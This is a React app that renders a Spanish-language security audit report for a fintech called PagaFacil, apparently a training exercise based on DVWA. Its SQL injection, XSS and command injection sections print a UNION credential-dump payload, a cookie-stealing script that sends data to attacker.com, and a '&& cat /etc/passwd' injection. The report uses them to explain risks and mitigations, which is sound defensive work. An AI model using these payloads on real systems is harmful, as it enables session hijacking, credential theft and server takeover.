import React, { useState, useEffect } from 'react';

// ==========================================
// ICONOS SVG
// ==========================================
const ShieldIcon = () => (
  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
);
const DatabaseIcon = () => (
  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4m0 5c0 2.21-3.582 4-8 4s-8-1.79-8-4" /></svg>
);
const CodeIcon = () => (
  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4" /></svg>
);
const TerminalIcon = () => (
  <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>
);

// ==========================================
// COMPONENTES DE DOCUMENTACIÓN (docs_lopeli/)
// ==========================================

const Resumen = () => (
  <div className="space-y-6">
    <header className="border-b pb-4 border-slate-200 dark:border-slate-700">
      <span className="text-xs font-mono text-indigo-500">docs_lopeli/01_resumen_lopeli.md</span>
      <h1 className="text-3xl font-bold text-slate-900 dark:text-white mt-1">Resumen Ejecutivo: PagaFacil</h1>
    </header>
    <div className="prose dark:prose-invert max-w-none space-y-4">
      <p>Este informe detalla la auditoría de seguridad para <strong>PagaFacil</strong>, plataforma Fintech que gestiona billeteras digitales y datos bancarios sensibles.</p>
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-4 text-center">
        <div className="p-4 bg-indigo-50 dark:bg-slate-800 rounded-lg">
          <p className="text-xl font-bold text-indigo-600">Billeteras</p>
          <p className="text-xs opacity-75 text-slate-700 dark:text-slate-300">Gestión de activos</p>
        </div>
        <div className="p-4 bg-indigo-50 dark:bg-slate-800 rounded-lg">
          <p className="text-xl font-bold text-indigo-600">Transacciones</p>
          <p className="text-xs opacity-75 text-slate-700 dark:text-slate-300">Flujo de capital</p>
        </div>
        <div className="p-4 bg-indigo-50 dark:bg-slate-800 rounded-lg">
          <p className="text-xl font-bold text-indigo-600">Datos Bancarios</p>
          <p className="text-xs opacity-75 text-slate-700 dark:text-slate-300">Información Crítica</p>
        </div>
      </div>
    </div>
  </div>
);

const SQLi = () => (
  <div className="space-y-6">
    <header className="border-b pb-4 border-slate-200 dark:border-slate-700">
      <span className="text-xs font-mono text-indigo-500">docs_lopeli/02_sqli_lopeli.md</span>
      <h1 className="text-3xl font-bold text-slate-900 dark:text-white mt-1">Inyección SQL (SQLi)</h1>
    </header>
    <div className="space-y-4">
      <div className="bg-slate-100 dark:bg-slate-800 p-4 rounded border-l-4 border-rose-500">
        <h4 className="font-bold text-rose-600">Evidencia de Explotación</h4>
        <p className="text-sm font-mono mt-2 text-slate-800 dark:text-slate-200">Payload: %' UNION SELECT null, concat(user,0x3a,password) FROM users #</p>
      </div>
      <div className="p-4 bg-slate-900 text-emerald-400 font-mono text-xs rounded-lg">
        [+] Database exfiltrated: PagaFacil_Production <br/>
        [+] Admin user found: root_pagafacil <br/>
        [+] Hash: 5f4dcc3b5aa765d61d8327deb882cf99
      </div>
      <div className="text-sm text-slate-700 dark:text-slate-300">
        <h4 className="font-bold mb-1">Defensa:</h4>
        <p>Implementación de Prepared Statements y ORM para evitar la concatenación de variables en queries.</p>
      </div>
    </div>
  </div>
);

const XSS = () => (
  <div className="space-y-6">
    <header className="border-b pb-4 border-slate-200 dark:border-slate-700">
      <span className="text-xs font-mono text-indigo-500">docs_lopeli/03_xss_lopeli.md</span>
      <h1 className="text-3xl font-bold text-slate-900 dark:text-white mt-1">Cross-Site Scripting (XSS)</h1>
    </header>
    <div className="space-y-4">
      <div className="bg-slate-100 dark:bg-slate-800 p-4 rounded border-l-4 border-amber-500">
        <h4 className="font-bold text-amber-600">Robo de Cookies de Sesión</h4>
        <p className="text-sm font-mono mt-2 text-slate-800 dark:text-slate-200">
          Payload: &lt;script&gt;fetch('https://attacker.com?c='+document.cookie)&lt;/script&gt;
        </p>
      </div>
      <div className="text-sm text-slate-700 dark:text-slate-300">
        <h4 className="font-bold mb-1">Impacto en Fintech:</h4>
        <p>Secuestro de sesión de clientes para realizar transferencias no autorizadas desde la billetera digital.</p>
      </div>
    </div>
  </div>
);

const Comandos = () => (
  <div className="space-y-6">
    <header className="border-b pb-4 border-slate-200 dark:border-slate-700">
      <span className="text-xs font-mono text-indigo-500">docs_lopeli/04_comandos_lopeli.md</span>
      <h1 className="text-3xl font-bold text-slate-900 dark:text-white mt-1">Inyección de Comandos</h1>
    </header>
    <div className="space-y-4">
      <div className="bg-slate-100 dark:bg-slate-800 p-4 rounded border-l-4 border-rose-600">
        <h4 className="font-bold text-rose-600">RCE (Remote Code Execution)</h4>
        <p className="text-sm font-mono mt-2 text-slate-800 dark:text-slate-200">Input: 8.8.8.8 && cat /etc/passwd</p>
      </div>
      <div className="text-sm text-slate-700 dark:text-slate-300">
        <h4 className="font-bold mb-1">Gravedad: Crítica (CVSS 9.8)</h4>
        <p>Permite el control total del servidor que procesa las transacciones bancarias de PagaFacil.</p>
      </div>
    </div>
  </div>
);

const Activos = () => (
  <div className="space-y-6">
    <header className="border-b pb-4 border-slate-200 dark:border-slate-700">
      <span className="text-xs font-mono text-indigo-500">docs_lopeli/05_activos_lopeli.md</span>
      <h1 className="text-3xl font-bold text-slate-900 dark:text-white mt-1">Activos de Información</h1>
    </header>
    <div className="overflow-x-auto">
      <table className="w-full text-sm text-left border-collapse border border-slate-200 dark:border-slate-700">
        <thead className="bg-slate-50 dark:bg-slate-800">
          <tr>
            <th className="p-3 border border-slate-200 dark:border-slate-700">Activo</th>
            <th className="p-3 border border-slate-200 dark:border-slate-700">Tipo</th>
            <th className="p-3 border border-slate-200 dark:border-slate-700">Criticidad</th>
          </tr>
        </thead>
        <tbody className="text-slate-700 dark:text-slate-300">
          <tr>
            <td className="p-3 border border-slate-200 dark:border-slate-700">Base de Datos de Clientes</td>
            <td className="p-3 border border-slate-200 dark:border-slate-700">Información</td>
            <td className="p-3 border border-slate-200 dark:border-slate-700 font-bold text-rose-500">Alta</td>
          </tr>
          <tr>
            <td className="p-3 border border-slate-200 dark:border-slate-700">Llaves de API Bancaria</td>
            <td className="p-3 border border-slate-200 dark:border-slate-700">Técnico</td>
            <td className="p-3 border border-slate-200 dark:border-slate-700 font-bold text-rose-500">Crítica</td>
          </tr>
          <tr>
            <td className="p-3 border border-slate-200 dark:border-slate-700">Tokens de Sesión</td>
            <td className="p-3 border border-slate-200 dark:border-slate-700">Software</td>
            <td className="p-3 border border-slate-200 dark:border-slate-700 font-bold text-amber-500">Media</td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
);

const Matriz = () => {
  const [selected, setSelected] = useState(null);
  
  const heatmap = [
    [1, 2, 3, 4, 5],
    [2, 4, 6, 8, 10],
    [3, 6, 9, 12, 15],
    [4, 8, 12, 16, 20],
    [5, 10, 15, 20, 25],
  ].reverse();

  const getColor = (val) => {
    if (val >= 15) return 'bg-rose-500 text-white';
    if (val >= 8) return 'bg-amber-500 text-white';
    return 'bg-emerald-500 text-white';
  };

  return (
    <div className="space-y-6">
      <header className="border-b pb-4 border-slate-200 dark:border-slate-700">
        <span className="text-xs font-mono text-indigo-500">docs_lopeli/06_matriz_lopeli.md</span>
        <h1 className="text-3xl font-bold text-slate-900 dark:text-white mt-1">Matriz de Riesgo</h1>
      </header>
      <div className="flex flex-col md:flex-row gap-8 items-center justify-center">
        <div className="grid grid-cols-5 gap-1 border-2 border-slate-300 dark:border-slate-600 p-2 rounded bg-slate-200 dark:bg-slate-700">
          {heatmap.map((row, i) => row.map((val, j) => (
            <div 
              key={`${i}-${j}`} 
              onClick={() => setSelected(val)}
              className={`w-12 h-12 md:w-16 md:h-16 flex items-center justify-center cursor-pointer hover:opacity-80 transition-opacity rounded ${getColor(val)}`}
            >
              <span className="text-xs font-bold">{val}</span>
            </div>
          )))}
        </div>
        <div className="max-w-xs text-sm text-slate-600 dark:text-slate-400 bg-slate-50 dark:bg-slate-800 p-4 rounded shadow">
          <h4 className="font-bold text-slate-900 dark:text-white mb-2">Interpretación:</h4>
          <p>Valores altos (Rojo) indican riesgos que requieren mitigación inmediata.</p>
          {selected && <div className="mt-4 p-2 bg-indigo-100 dark:bg-indigo-900 rounded font-bold text-indigo-700 dark:text-indigo-200">Valor seleccionado: {selected}</div>}
          <div className="mt-4 text-[10px] italic">
            Nota: P x I {' >= '} 16 requiere mitigación inmediata según estándares de PagaFacil.
          </div>
        </div>
      </div>
    </div>
  );
};

const Controles = () => (
  <div className="space-y-6">
    <header className="border-b pb-4 border-slate-200 dark:border-slate-700">
      <span className="text-xs font-mono text-indigo-500">docs_lopeli/07_controles_lopeli.md</span>
      <h1 className="text-3xl font-bold text-slate-900 dark:text-white mt-1">Prevención y Mitigación</h1>
    </header>
    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
      <div className="p-4 border border-slate-200 dark:border-slate-700 rounded-lg">
        <h4 className="font-bold text-indigo-500 mb-2">Controles Técnicos</h4>
        <ul className="text-sm list-disc pl-4 space-y-1 opacity-80">
          <li>WAF (Web Application Firewall) configurado.</li>
          <li>Hashing de contraseñas con Argon2.</li>
          <li>Tokenización de datos de tarjetas bancarias.</li>
        </ul>
      </div>
      <div className="p-4 border border-slate-200 dark:border-slate-700 rounded-lg">
        <h4 className="font-bold text-indigo-500 mb-2">Políticas Operativas</h4>
        <ul className="text-sm list-disc pl-4 space-y-1 opacity-80">
          <li>Auditorías mensuales de logs.</li>
          <li>MFA obligatorio para empleados.</li>
          <li>Principio de privilegio mínimo (Least Privilege).</li>
        </ul>
      </div>
    </div>
  </div>
);

const Recuperacion = () => (
  <div className="space-y-6">
    <header className="border-b pb-4 border-slate-200 dark:border-slate-700">
      <span className="text-xs font-mono text-indigo-500">docs_lopeli/08_recuperacion_lopeli.md</span>
      <h1 className="text-3xl font-bold text-slate-900 dark:text-white mt-1">Plan de Recuperación (DR)</h1>
    </header>
    <div className="p-6 bg-slate-900 text-indigo-300 font-mono text-xs rounded-xl border border-indigo-500 shadow-lg">
      <div className="mb-4 text-white border-b border-indigo-500 pb-2">ESTADO DEL PLAN: ACTIVO</div>
      <p className="mb-2">1. REPLICACIÓN DE DATOS: Snapshot diaria en AWS S3 + Glacier.</p>
      <p className="mb-2">2. RTO (Recovery Time Objective): 2 Horas.</p>
      <p className="mb-2">3. RPO (Recovery Point Objective): 15 Minutos.</p>
      <p>4. INFRAESTRUCTURA: Multi-AZ (Availability Zones).</p>
    </div>
  </div>
);

const Prompts = () => (
  <div className="space-y-6">
    <header className="border-b pb-4 border-slate-200 dark:border-slate-700">
      <span className="text-xs font-mono text-indigo-500">docs_lopeli/09_prompts_lopeli.md</span>
      <h1 className="text-3xl font-bold text-slate-900 dark:text-white mt-1">Bitácora de Uso de IA</h1>
    </header>
    <div className="space-y-4">
      <div className="p-4 bg-slate-50 dark:bg-slate-800 rounded border-l-4 border-indigo-500 italic text-sm">
        "ChatGPT: Genera una matriz de riesgo 5x5 enfocada en una Fintech que sufre ataques de SQLi y XSS, priorizando el impacto financiero y reputacional."
      </div>
      <p className="text-sm text-slate-700 dark:text-slate-300">
        Se utilizó inteligencia artificial para estructurar los planes de remediación y simular escenarios de impacto de negocio basados en los hallazgos técnicos de DVWA.
      </p>
    </div>
  </div>
);

// ==========================================
// APLICACIÓN PRINCIPAL
// ==========================================

export default function App() {
  const [activeTab, setActiveTab] = useState('resumen');
  const [darkMode, setDarkMode] = useState(true);
  const [menuOpen, setMenuOpen] = useState(false);

  const menuItems = [
    { id: 'resumen', label: 'Resumen Ejecutivo', component: <Resumen />, icon: <ShieldIcon /> },
    { id: 'sqli', label: 'Inyección SQL', component: <SQLi />, icon: <DatabaseIcon /> },
    { id: 'xss', label: 'XSS', component: <XSS />, icon: <CodeIcon /> },
    { id: 'comandos', label: 'Inyección de Comandos', component: <Comandos />, icon: <TerminalIcon /> },
    { id: 'activos', label: 'Activos', component: <Activos />, icon: <ShieldIcon /> },
    { id: 'matriz', label: 'Matriz de Riesgo', component: <Matriz />, icon: <ShieldIcon /> },
    { id: 'controles', label: 'Controles', component: <Controles />, icon: <ShieldIcon /> },
    { id: 'recuperacion', label: 'Recuperación', component: <Recuperacion />, icon: <ShieldIcon /> },
    { id: 'prompts', label: 'Bitácora IA', component: <Prompts />, icon: <CodeIcon /> },
  ];

  const ActiveComponent = menuItems.find(item => item.id === activeTab)?.component;

  return (
    <div className={`${darkMode ? 'dark' : ''} min-h-screen transition-colors duration-300`}>
      <div className="bg-white dark:bg-slate-950 text-slate-900 dark:text-slate-100 flex flex-col md:flex-row min-h-screen">
        
        {/* SIDEBAR / NAVIGATION */}
        <aside className={`
          ${menuOpen ? 'translate-x-0' : '-translate-x-full'} 
          md:translate-x-0 fixed md:relative z-50 w-64 h-full bg-slate-50 dark:bg-slate-900 p-6 border-r border-slate-200 dark:border-slate-800 transition-transform duration-300
        `}>
          <div className="flex items-center mb-8 gap-2">
            <div className="w-8 h-8 bg-indigo-600 rounded flex items-center justify-center font-bold text-white">PF</div>
            <h2 className="text-xl font-bold tracking-tight">Auditoría LOPELI</h2>
          </div>

          <nav className="space-y-2">
            {menuItems.map(item => (
              <button
                key={item.id}
                onClick={() => { setActiveTab(item.id); setMenuOpen(false); }}
                className={`w-full flex items-center p-3 rounded-lg text-sm font-medium transition-colors ${activeTab === item.id ? 'bg-indigo-600 text-white shadow-lg' : 'hover:bg-slate-200 dark:hover:bg-slate-800'}`}
              >
                {item.icon}
                {item.label}
              </button>
            ))}
          </nav>

          <div className="absolute bottom-8 left-6 right-6">
            <a href="https://github.com" target="_blank" className="flex items-center gap-2 text-xs opacity-50 hover:opacity-100 transition-opacity">
              <CodeIcon />
              github.com/lopeli-audit
            </a>
          </div>
        </aside>

        {/* MOBILE OVERLAY */}
        {menuOpen && <div className="fixed inset-0 bg-black/50 z-40 md:hidden" onClick={() => setMenuOpen(false)}></div>}

        {/* MAIN CONTENT AREA */}
        <main className="flex-1 flex flex-col overflow-hidden">
          
          {/* HEADER */}
          <header className="h-16 border-b border-slate-200 dark:border-slate-800 flex items-center justify-between px-6 bg-white dark:bg-slate-950/50 backdrop-blur-md sticky top-0 z-30">
            <button onClick={() => setMenuOpen(true)} className="md:hidden p-2 bg-slate-100 dark:bg-slate-800 rounded">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
            </button>
            
            <div className="hidden md:block text-xs opacity-50">
              <span className="font-bold">Fintech:</span> PagaFacil | <span className="font-bold">Auditor:</span> LOPELI
            </div>

            <button 
              onClick={() => setDarkMode(!darkMode)}
              className="p-2 bg-slate-100 dark:bg-slate-800 rounded-full transition-transform hover:rotate-12"
            >
              {darkMode ? '☀️' : '🌙'}
            </button>
          </header>

          {/* CONTENT */}
          <section className="flex-1 overflow-y-auto p-6 md:p-12">
            <div className="max-w-4xl mx-auto bg-white dark:bg-slate-900 md:p-10 p-6 rounded-2xl shadow-xl border border-slate-100 dark:border-slate-800 animate-in fade-in slide-in-from-bottom-4 duration-700">
              {ActiveComponent}
            </div>
          </section>

          {/* FOOTER */}
          <footer className="p-4 text-[10px] text-center opacity-30 border-t border-slate-200 dark:border-slate-800">
            © 2024 Auditoría de Seguridad PagaFacil - Sistema Integrado LOPELI
          </footer>
        </main>
      </div>
    </div>
  );
}